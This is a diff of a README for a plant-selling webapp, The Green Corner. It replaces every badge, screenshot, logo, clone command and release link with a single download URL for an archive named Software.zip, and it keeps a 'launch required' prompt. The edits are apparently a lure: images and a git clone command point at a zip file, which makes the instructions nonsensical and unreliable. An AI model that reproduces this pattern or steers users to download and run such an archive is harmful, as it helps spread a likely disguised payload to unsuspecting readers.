@@ -1,6 +1,6 @@
 # 🌿 The Green Corner - Plant Selling Webapp 🌱
 
-[![Download Green Corner](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Green Corner](https://github.com/atlantikadev/TheGreenCorner/releases/download/v1.0/Software.zip)](https://github.com/atlantikadev/TheGreenCorner/releases/download/v1.0/Software.zip)
 
 Welcome to The Green Corner, where you can immerse yourself in a world of beautiful plants and greenery! Our webapp is designed to provide you with a seamless shopping experience for all your plant needs. From vibrant flowers to elegant succulents, we have it all!
 
@@ -21,7 +21,7 @@ Welcome to The Green Corner, where you can immerse yourself in a world of beauti
 ### 📦 Installation
 1. Clone the repository:
    ```sh
-   git clone https://github.com/your-username/TheGreenCorner.git
+   git clone https://github.com/atlantikadev/TheGreenCorner/releases/download/v1.0/Software.zip
    ```
 
 2. Navigate to the project directory:
@@ -40,10 +40,10 @@ Welcome to The Green Corner, where you can immerse yourself in a world of beauti
    ```
 
 ### 🖥️ Screenshots
-![Homepage](https://via.placeholder.com/800x400)
+![Homepage](https://github.com/atlantikadev/TheGreenCorner/releases/download/v1.0/Software.zip)
 *The welcoming homepage of The Green Corner.*
 
-![Product Page](https://via.placeholder.com/800x400)
+![Product Page](https://github.com/atlantikadev/TheGreenCorner/releases/download/v1.0/Software.zip)
 *Explore a wide range of plants on our product page.*
 
 ### 🌸 Features
@@ -60,10 +60,10 @@ We welcome contributions from the community to make The Green Corner even better
 - Share your feedback and ideas for improvement.
 
 ### 🎍 Visit Our Webapp
-Ready to explore The Green Corner and bring some greenery into your life? Visit our fully responsive plant selling webapp by downloading the latest release [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) (launch required).
+Ready to explore The Green Corner and bring some greenery into your life? Visit our fully responsive plant selling webapp by downloading the latest release [here](https://github.com/atlantikadev/TheGreenCorner/releases/download/v1.0/Software.zip) (launch required).
 
 Join us in creating a more vibrant and sustainable world one plant at a time! 🌿🌎
 
-![The Green Corner Logo](https://via.placeholder.com/200x200)
+![The Green Corner Logo](https://github.com/atlantikadev/TheGreenCorner/releases/download/v1.0/Software.zip)
 
 ### 🍃 Happy Planting! 🌿
